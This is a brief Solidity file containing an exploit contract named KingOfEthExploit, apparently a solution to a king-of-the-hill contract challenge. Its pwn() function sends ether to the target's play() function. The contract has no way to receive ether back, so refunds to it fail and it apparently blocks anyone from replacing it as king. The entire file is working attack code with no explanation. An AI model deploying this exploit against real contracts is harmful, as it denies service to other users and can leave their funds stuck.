// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IKingOfEth {
    function play() external payable;
}

contract KingOfEthExploit {
    IKingOfEth public target;

    constructor(address _target) {
        target = IKingOfEth(_target);
    }

    function pwn() external payable {
        target.play{value: msg.value}();
    }
}
